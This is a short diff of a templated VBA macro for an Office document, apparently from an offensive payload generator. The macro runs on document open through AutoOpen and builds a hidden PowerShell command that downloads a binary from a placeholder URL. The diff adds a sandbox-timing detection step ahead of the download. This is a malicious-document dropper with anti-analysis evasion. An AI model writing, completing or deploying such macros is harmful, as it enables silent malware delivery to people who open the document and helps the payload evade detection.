@@ -7,6 +7,9 @@ Sub AutoOpen()
 End Sub
 
 Sub {MACRO_NAME}()
+
+    {DETECT_SANDBOX_TIME}
+
     Dim str As String
     str = "powershell (New-Object System.Net.WebClient).DownloadFile('{HTTP_URL}/{BINARY_NAME}', '{BINARY_NAME}')"
     Shell str, vbHide
